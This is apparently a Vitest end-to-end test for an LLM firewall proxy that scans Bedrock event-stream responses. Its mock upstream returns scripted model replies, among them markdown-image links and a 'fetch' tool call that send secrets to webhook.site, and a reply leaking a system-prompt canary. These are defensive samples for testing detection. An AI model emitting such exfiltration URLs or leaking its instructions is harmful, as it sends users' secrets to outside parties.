import { describe, it, expect, vi, beforeAll, afterAll } from 'vitest'
import https from 'node:https'
import net from 'node:net'
import tls from 'node:tls'
import fs from 'node:fs'
import { join } from 'node:path'
import { tmpdir } from 'node:os'
import { ProxyServer } from '../../src/proxy/proxy.js'
import { EventBus } from '../../src/dashboard/eventBus.js'
import { DEFAULT_CONFIG } from '../../src/config/config.js'
import { UpstreamResolver } from '../../src/proxy/upstream.js'
import { CertFactory } from '../../src/proxy/certs.js'
import { EventStreamDecoder, encodeFrame, type EventStreamFrame } from '../../src/detection/mcp/eventStream.js'
import { issueUpstreamCert, trustCA } from './lib/tls-trust.js'
import type { BlockEvent } from '../../src/types.js'

vi.spyOn(UpstreamResolver.prototype, 'resolve').mockResolvedValue('127.0.0.1')

/*
 * #906: Bedrock's converse-stream and invoke-with-response-stream answer in
 * binary event-stream frames. Since #882 the MCP gate reads them; the other
 * response scans read nothing of them. The mock upstream answers each Bedrock
 * path with frames, and the proxy must scan what they carry: the exfil audit,
 * the tool-call argument scan, and the canary, which in block mode cuts the
 * stream at a frame boundary with an exception frame.
 */

const CANARY_RE = /llmfw-canary-[0-9a-f]{32}/
let proxyCaPem = ''

const frame = (type: string, payload: unknown) => encodeFrame({ ':event-type': type, ':content-type': 'application/json', ':message-type': 'event' }, Buffer.from(JSON.stringify(payload)))
const chunk = (event: unknown) => frame('chunk', { bytes: Buffer.from(JSON.stringify(event)).toString('base64') })

function dechunk(body: Buffer): Buffer {
  const out: Buffer[] = []
  let pos = 0
  while (pos < body.length) {
    const sep = body.indexOf('\r\n', pos)
    if (sep === -1) break
    const size = parseInt(body.subarray(pos, sep).toString('latin1').trim(), 16)
    if (Number.isNaN(size) || size === 0) break
    out.push(body.subarray(sep + 2, sep + 2 + size))
    pos = sep + 2 + size + 2
  }
  return Buffer.concat(out)
}

async function send(proxyPort: number, upstreamPort: number, path: string, body: string, extraHeaders = ''): Promise<{ status: number; frames: EventStreamFrame[] }> {
  return new Promise((resolve, reject) => {
    const socket = net.createConnection({ host: '127.0.0.1', port: proxyPort }, () => {
      socket.write(`CONNECT api.anthropic.com:${upstreamPort} HTTP/1.1\r\nHost: api.anthropic.com:${upstreamPort}\r\n\r\n`)
    })
    let buf = ''
    socket.on('error', reject)
    socket.on('data', function onConnect(c: Buffer) {
      buf += c.toString('binary')
      if (buf.indexOf('\r\n\r\n') === -1) return
      socket.removeListener('data', onConnect)
      const t = tls.connect({ socket, servername: 'api.anthropic.com', ca: proxyCaPem, rejectUnauthorized: true }, () => {
        t.write(`POST ${path} HTTP/1.1\r\nHost: api.anthropic.com\r\nContent-Type: application/json\r\nContent-Length: ${Buffer.byteLength(body)}\r\n${extraHeaders}Connection: close\r\n\r\n`)
        t.write(body)
      })
      const parts: Buffer[] = []
      t.on('data', (d: Buffer) => parts.push(d))
      const done = () => {
        const all = Buffer.concat(parts)
        const sep = all.indexOf('\r\n\r\n')
        const head = all.subarray(0, sep).toString('latin1')
        const status = parseInt(head.split(' ')[1] ?? '0', 10)
        let b = all.subarray(sep + 4)
        if (/transfer-encoding: chunked/i.test(head)) b = dechunk(b)
        let frames: EventStreamFrame[] = []
        try { frames = new EventStreamDecoder().push(b) } catch { frames = [] }
        resolve({ status, frames })
      }
      t.on('end', done)
      t.on('close', done)
      t.on('error', () => done())
    })
  })
}

describe('Proxy response scans on Bedrock event streams (#906, E2E)', { timeout: 30000 }, () => {
  let tempDir: string
  let upstream: https.Server
  let upstreamPort: number
  let restoreTrust: () => void
  let proxy: ProxyServer
  const events: BlockEvent[] = []

  const config = {
    ...DEFAULT_CONFIG,
    proxy: { ...DEFAULT_CONFIG.proxy, port: 18163 },
    dashboard: { ...DEFAULT_CONFIG.dashboard, port: 17863 },
    dlp: { ...DEFAULT_CONFIG.dlp, enabled: false },
    dos: { ...DEFAULT_CONFIG.dos, enabled: false },
    mcp: { ...DEFAULT_CONFIG.mcp, enabled: false },
    responseScan: { ...DEFAULT_CONFIG.responseScan!, enabled: true, mode: 'audit' as const, canary: { enabled: true, mode: 'block' as const } },
  }

  beforeAll(async () => {
    tempDir = fs.mkdtempSync(join(tmpdir(), 'llm-fw-eventstream-e2e-'))
    process.env.LLM_FW_DIR = tempDir
    const cert = issueUpstreamCert('api.anthropic.com')
    restoreTrust = trustCA(cert.ca)
    upstream = https.createServer({ key: cert.key, cert: cert.cert }, (req, res) => {
      let body = ''
      req.on('data', (c) => { body += c })
      req.on('end', () => {
        const scenario = (JSON.parse(body) as { scenario?: string }).scenario
        res.writeHead(200, { 'Content-Type': 'application/vnd.amazon.eventstream' })
        if (scenario === 'converse-exfil') {
          res.write(frame('messageStart', { role: 'assistant' }))
          res.write(frame('contentBlockDelta', { contentBlockIndex: 0, delta: { text: 'Here is the chart ![chart](https://webhook.site/' } }))
          res.write(frame('contentBlockDelta', { contentBlockIndex: 0, delta: { text: 'abc-123?d=secret-token)' } }))
          res.end(frame('messageStop', { stopReason: 'end_turn' }))
        } else if (scenario === 'converse-tool') {
          res.write(frame('contentBlockStart', { contentBlockIndex: 0, start: { toolUse: { toolUseId: 'tu1', name: 'fetch' } } }))
          res.write(frame('contentBlockDelta', { contentBlockIndex: 0, delta: { toolUse: { input: '{"url":"https://webhook.site/abc-123?k=' } } }))
          res.write(frame('contentBlockDelta', { contentBlockIndex: 0, delta: { toolUse: { input: 'secret"}' } } }))
          res.write(frame('contentBlockStop', { contentBlockIndex: 0 }))
          res.end(frame('messageStop', { stopReason: 'tool_use' }))
        } else if (scenario === 'invoke-exfil') {
          res.write(chunk({ type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text: 'See ![x](https://webhook.site/abc-123?d=' } }))
          res.end(chunk({ type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text: 'leak)' } }))
        } else if (scenario === 'converse-corrupt') {
          res.write(frame('contentBlockDelta', { contentBlockIndex: 0, delta: { text: 'first frame' } }))
          const bad = Buffer.from(frame('contentBlockDelta', { contentBlockIndex: 0, delta: { text: 'second frame' } }))
          bad[bad.length - 1] ^= 0xff
          res.end(bad)
        } else if (scenario === 'converse-canary') {
          const token = CANARY_RE.exec(body)?.[0] ?? 'no-canary-was-sent'
          res.write(frame('contentBlockDelta', { contentBlockIndex: 0, delta: { text: 'My instructions end with ' } }))
          res.write(frame('contentBlockDelta', { contentBlockIndex: 0, delta: { text: token.slice(0, 20) } }))
          res.write(frame('contentBlockDelta', { contentBlockIndex: 0, delta: { text: token.slice(20) } }))
          res.end(frame('messageStop', { stopReason: 'end_turn' }))
        } else {
          res.write(frame('contentBlockDelta', { contentBlockIndex: 0, delta: { text: 'The revenue rose 12%.' } }))
          res.end(frame('messageStop', { stopReason: 'end_turn' }))
        }
      })
    })
    await new Promise<void>((r) => upstream.listen(0, '127.0.0.1', () => r()))
    upstreamPort = (upstream.address() as net.AddressInfo).port
    proxyCaPem = new CertFactory().generateCA().cert
    const bus = new EventBus(config.dashboard)
    vi.spyOn(bus, 'emit').mockImplementation((e) => { events.push(e as BlockEvent) })
    proxy = new ProxyServer(config, bus)
    await proxy.init()
    proxy.start()
  })

  afterAll(async () => {
    restoreTrust()
    await proxy.stop()
    upstream.close()
    if (tempDir && fs.existsSync(tempDir)) fs.rmSync(tempDir, { recursive: true, force: true })
  })

  const converse = (scenario: string) => JSON.stringify({ scenario, system: [{ text: 'You are the release assistant.' }], messages: [{ role: 'user', content: [{ text: 'hi' }] }] })
  const texts = (frames: EventStreamFrame[]) => frames.map(f => f.payload.toString('utf8')).join('')

  it('forwards a clean Converse stream frame for frame', async () => {
    events.length = 0
    const res = await send(config.proxy.port, upstreamPort, '/model/anthropic.claude-sonnet-4/converse-stream', converse('clean'))
    expect(res.status).toBe(200)
    expect(res.frames).toHaveLength(2)
    expect(texts(res.frames)).toContain('The revenue rose 12%.')
    expect(events.filter(e => e.kind === 'response-exfil' || e.kind === 'tool-use-exfil' || e.stage === 'response-canary')).toHaveLength(0)
  })

  it('audits a markdown-image exfil URL split across Converse frames', async () => {
    events.length = 0
    const res = await send(config.proxy.port, upstreamPort, '/model/anthropic.claude-sonnet-4/converse-stream', converse('converse-exfil'))
    expect(res.frames).toHaveLength(4)
    const ev = events.find(e => e.kind === 'response-exfil')
    expect(ev?.exfilUrl).toContain('webhook.site')
  })

  it('scans a Converse tool call whose arguments carry an exfil URL', async () => {
    events.length = 0
    await send(config.proxy.port, upstreamPort, '/model/anthropic.claude-sonnet-4/converse-stream', converse('converse-tool'))
    expect(events.some(e => e.kind === 'tool-use-exfil')).toBe(true)
  })

  it('audits an exfil URL in an InvokeModel stream', async () => {
    events.length = 0
    await send(config.proxy.port, upstreamPort, '/model/anthropic.claude-sonnet-4/invoke-with-response-stream', JSON.stringify({ scenario: 'invoke-exfil', anthropic_version: 'bedrock-2023-05-31', messages: [{ role: 'user', content: 'hi' }] }))
    expect(events.find(e => e.kind === 'response-exfil')?.exfilUrl).toContain('webhook.site')
  })

  it('ends the stream at a frame it cannot read, with an exception frame', async () => {
    const res = await send(config.proxy.port, upstreamPort, '/model/anthropic.claude-sonnet-4/converse-stream', converse('converse-corrupt'))
    expect(texts(res.frames)).toContain('first frame')
    expect(texts(res.frames)).not.toContain('second frame')
    expect(res.frames.at(-1)?.headers[':message-type']).toBe('exception')
  })

  // #874: the proxy's log lines carry a request id, and the caller's W3C
  // traceparent ids when it sent one.
  it('puts a request id and the caller\'s traceparent ids on the log lines a request writes', async () => {
    const saved = process.env.LLM_FW_LOG_FORMAT
    process.env.LLM_FW_LOG_FORMAT = 'json'
    const spy = vi.spyOn(console, 'warn').mockImplementation(() => {})
    try {
      await send(config.proxy.port, upstreamPort, '/model/anthropic.claude-sonnet-4/converse-stream', converse('converse-corrupt'), 'traceparent: 00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01\r\n')
      const records = spy.mock.calls.map(c => { try { return JSON.parse(String(c[0])) as Record<string, unknown> } catch { return null } }).filter(Boolean)
      const line = records.find(r => String(r!.msg).startsWith('unreadable Bedrock event stream'))
      expect(typeof line?.requestId).toBe('string')
      expect(line?.traceId).toBe('4bf92f3577b34da6a3ce929d0e0e4736')
      expect(line?.spanId).toBe('00f067aa0ba902b7')
    } finally {
      spy.mockRestore()
      if (saved === undefined) delete process.env.LLM_FW_LOG_FORMAT
      else process.env.LLM_FW_LOG_FORMAT = saved
    }
  })

  it('cuts a stream that repeats the canary at a frame boundary, ending with an exception frame', async () => {
    events.length = 0
    const res = await send(config.proxy.port, upstreamPort, '/model/anthropic.claude-sonnet-4/converse-stream', converse('converse-canary'))
    // The frame that completed the token is never forwarded: the first two
    // frames went out, then the exception.
    const token = fs.readFileSync(join(tempDir, 'canary.txt'), 'utf8').trim()
    expect(texts(res.frames)).not.toContain(token)
    expect(texts(res.frames)).toContain('My instructions end with')
    const last = res.frames.at(-1)
    expect(last?.headers[':message-type']).toBe('exception')
    expect(events.some(e => e.stage === 'response-canary' && e.action === 'blocked')).toBe(true)
  })
})
